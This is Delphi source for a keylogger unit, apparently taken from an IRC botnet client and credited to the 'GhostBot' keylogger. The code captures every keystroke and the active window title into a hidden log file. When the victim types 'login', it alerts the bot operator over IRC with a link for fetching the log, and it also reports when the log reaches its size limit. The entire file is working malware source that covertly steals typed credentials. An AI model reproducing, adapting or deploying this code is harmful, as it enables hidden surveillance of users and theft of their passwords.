{ This keylogg unit is based on positrons GhostBot Keylogger Component.
  Its slightly changed (rewritten only), but mostly positrons source. So if you are gonna use it
  make credit where credit is due.
}

unit untKeyLog;

interface

Uses
  Windows, untFunctions, untBot;

{$I config.ini}

VAR
  KeyFile : File;
  cWindow : String;
  cHandle : THandle;
  Login   : String;

  Procedure GetLetter;

implementation

Function TrimRight(const S: String): String;
Var
  I: Integer;
Begin
  I := Length(S);
  While (I > 0) And (S[I] <= ' ') Do Dec(I);
  Result := Copy(S, 1, I);
End;

Function Shift: Boolean;
Begin Shift := GetASyncKeyState(VK_SHIFT)<>0; End;

Function MoreChars(CharNumber: Integer; TruePart, FalsePart: String; Var Answer: String): Boolean;
Begin
  MoreChars := True;
  If (Odd(GetASyncKeyState(CharNumber))) Then
  Begin
    If (Shift) Then Answer := TruePart Else Answer := FalsePart;
    Exit;
  End;
  MoreChars := False;
End;

Function ActiveHandle: THandle;
Begin
  Result := GetForeGroundWindow;
End;

Function ActiveCaption: String;
Var
  Handle        :THandle;
  Len           :LongInt;
  Title         :String;
Begin
  Handle := GetForeGroundWindow;
  Len    := GetWindowTextLength(Handle)+1;
  SetLength(Title, Len);
  GetWindowText(Handle, pChar(Title), Len);
  ActiveCaption := TrimRight(Title);
End;

Procedure ShowLetter(strLetter: String);
Var
  S: String;
  T: String;
  Path: String;
  I: Integer;
Begin
  If (Length(Login) < 5) Then
    Login := Login + strLetter
  Else
  Begin
    Repeat
      Delete(Login,1,1);
    Until Length(Login) < 5;
    Login := Login + strLetter;
  End;

  If (Pos('login', lowercase(Login)) > 0) Then
  Begin
    Path := GetDirectory(0) + bot_keylogg_name;
    Delete(Path, 1, 3);
    For I := 1 To Length(Path) Do
      If (Path[I] = '\') Then Path[I] := '/';

    T := 'PRIVMSG '+Bot.IRC.LoggedName+' :[Keygrab] User wrote "login"; http://'+GetLocalIP+':81/'+Path+#10;
    Bot.SendData(T, False, Bot.IRC.Sock);
    Login := '';
  End;

  If (cHandle <> ActiveHandle) Then
    If (cWindow <> ActiveCaption) Then
    Begin
      cWindow := ActiveCaption;
      strLetter := #13#10'['+cWindow+']'#13#10+strLetter;
    End;

  S := GetDirectory(0)+'st.log';

  {$I-}
    AssignFile(KeyFile, S);
  {$I+}
  If Not (FileExists(S)) Then
  Begin
    {$I-}
    ReWrite(KeyFile);
    If (IOResult = 0) Then
    Begin
      CloseFile(KeyFile);
      SetFileAttributes(pChar(S), FILE_ATTRIBUTE_HIDDEN);
    End;
    {$I+}
  End;
  {$I-}
  FileMode := 2;
  Reset(KeyFile, 1);
  Seek(KeyFile, FileSize(KeyFile));
  If (Length(strLetteR) > 0) Then BlockWrite(KeyFile, strLetter[1], Length(strLetter));
  CloseFile(KeyFile);
  {$I+}

  If (BOT_KEYLOGG_SIZE > 0) Then
    If (GetFileSize(S) > BOT_KEYLOGG_SIZE) Then
    Begin
      T := 'PRIVMSG '+Bot.IRC.LoggedName+' :[Keylogger] Max-size of logfile reached. Saved as (st.log-backup)'#10;
      Bot.SendData(T, False, Bot.IRC.Sock);

      Path := GetDirectory(0) + '\st.log';
      CopyFile(pChar(Path), pChar(Path+'-backup'), False);
      DeleteFile(pChar(Path));
    End;
End;

Procedure GetLetter;
Var
  J:    Integer;
  A:    String;
Begin
  While (TRUE) Do
  Begin
    For J := 65   To 90   Do        If Odd(GetASyncKeyState(J)) Then ShowLetter(Chr(J));
    For J := 96   To 105  Do        If Odd(GetASyncKeyState(J)) Then ShowLetter(IntToStr((J-97)+1));
    For J := 112  To 135  Do        If Odd(GetASyncKeyState(J)) Then ShowLetter('{F'+IntToStr(J-112+1)+'}');
    For J := 48   To 57   Do        If Odd(GetASyncKeyState(J)) Then
      If (Shift) Then
      Begin
        Case (J-48) Of
          1: ShowLetter('!');
          2: ShowLetter('@');
          3: ShowLetter('#');
          4: ShowLetter('$');
          5: ShowLetter('%');
          6: ShowLetter('^');
          7: ShowLetter('&');
          8: ShowLetter('*');
          9: ShowLetter('(');
          0: ShowLetter(')');
        End;
      End Else ShowLetter(IntToStr(J-48));

    If Odd(GetASyncKeyState(VK_BACK))           Then ShowLetter('<Back>');
    If Odd(GetASyncKeyState(VK_TAB))            Then ShowLetter('<Tab>');
    If Odd(GetASyncKeyState(VK_RETURN))         Then ShowLetter(#13#10);
    If Odd(GetASyncKeyState(VK_SHIFT))          Then ShowLetter('<Shift>');
    If Odd(GetASyncKeyState(VK_CONTROL))        Then ShowLetter('<Ctrl>');
    If Odd(GetASyncKeyState(VK_MENU))           Then ShowLetter('<Alt>');
    If Odd(GetASyncKeyState(VK_PAUSE))          Then ShowLetter('<Pause>');
    If Odd(GetASyncKeyState(VK_ESCAPE))         Then ShowLetter('<ESC>');
    If Odd(GetASyncKeyState(VK_SPACE))          Then ShowLetter(' ');
    If Odd(GetASyncKeyState(VK_END))            Then ShowLetter('<END>');
    If Odd(GetASyncKeyState(VK_HOME))           Then ShowLetter('<Home>');
    If Odd(GetASyncKeyState(VK_LEFT))           Then ShowLetter('<Left>');
    If Odd(GetASyncKeyState(VK_RIGHT))          Then ShowLetter('<Right>');
    If Odd(GetASyncKeyState(VK_UP))             Then ShowLetter('<Up>');
    If Odd(GetASyncKeyState(VK_DOWN))           Then ShowLetter('<Down>');
    If Odd(GetASyncKeyState(VK_INSERT))         Then ShowLetter('<Insert>');
    If Odd(GetASyncKeyState(VK_MULTIPLY))       Then ShowLetter('*');
    If Odd(GetASyncKeyState(VK_ADD))            Then ShowLetter('+');
    If Odd(GetASyncKeyState(VK_SUBTRACT))       Then ShowLetter('-');
    If Odd(GetASyncKeyState(VK_DECIMAL))        Then ShowLetter(',');
    If Odd(GetASyncKeyState(VK_DIVIDE))         Then ShowLetter('/');
    If Odd(GetASyncKeyState(VK_NUMLOCK))        Then ShowLetter('<Num>');
    If Odd(GetASyncKeyState(VK_CAPITAL))        Then ShowLetter('<Capital>');
    If Odd(GetASyncKeyState(VK_SCROLL))         Then ShowLetter('<Scroll>');
    If Odd(GetASyncKeyState(VK_DELETE))         Then ShowLetter('<Del>');
    If Odd(GetASyncKeyState(VK_PRIOR))          Then ShowLetter('<PageUp>');
    If Odd(GetASyncKeyState(VK_NEXT))           Then ShowLetter('<PageDown>');
    If Odd(GetASyncKeyState(VK_PRINT))          Then ShowLetter('<Print>');

    If MoreChars($BA, ':', ';',  A) Then ShowLetter(A);
    If MoreChars($BB, '+', '=',  A) Then ShowLetter(A);
    If MoreChars($BC, '<', ',',  A) Then ShowLetter(A);
    If MoreChars($BD, '_', '-',  A) Then ShowLetter(A);
    If MoreChars($BE, '>', '.',  A) Then ShowLetter(A);
    If MoreChars($BF, '?', '/',  A) Then ShowLetter(A);
    If MoreChars($C0, '~', '`',  A) Then ShowLetter(A);
    If MoreChars($DB, '{', '[',  A) Then ShowLetter(A);
    If MoreChars($DC, '|', '\',  A) Then ShowLetter(A);
    If MoreChars($DD, '}', ']',  A) Then ShowLetter(A);
    If MoreChars($DE, '"', '''', A) Then ShowLetter(A);
    Sleep(100);
  End;
End;

end.
